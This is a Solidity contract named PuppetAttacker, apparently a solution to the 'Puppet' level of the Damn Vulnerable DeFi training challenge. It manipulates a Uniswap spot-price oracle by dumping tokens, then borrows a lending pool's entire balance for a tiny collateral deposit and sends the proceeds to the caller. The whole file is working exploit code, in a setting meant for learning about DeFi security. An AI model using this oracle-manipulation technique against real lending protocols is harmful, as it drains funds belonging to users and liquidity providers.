// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";
import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

import "hardhat/console.sol";

contract PuppetAttacker {

    using Address for address;

    PuppetPool private pool;
    address private exchangeAddr;
    address private pairAddr;
    DamnValuableToken private token;

    constructor(address poolAddr, address _exchangeAddr) {
        pool = PuppetPool(poolAddr);
        exchangeAddr = _exchangeAddr;
        pairAddr = pool.uniswapPair();
        token = pool.token();
    }

    function attack() external payable {
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
        token.approve(exchangeAddr, token.balanceOf(address(this)));

        exchangeAddr.functionCall(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                token.balanceOf(address(this)) - 1,
                1,
                block.timestamp
            )
        );

        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 deposit = pool.calculateDepositRequired(poolBalance);

        address(pool).functionCallWithValue(
            abi.encodeWithSignature(
                "borrow(uint256)",
                poolBalance
            ),
            deposit
        );

        token.transfer(msg.sender, token.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
    }
}
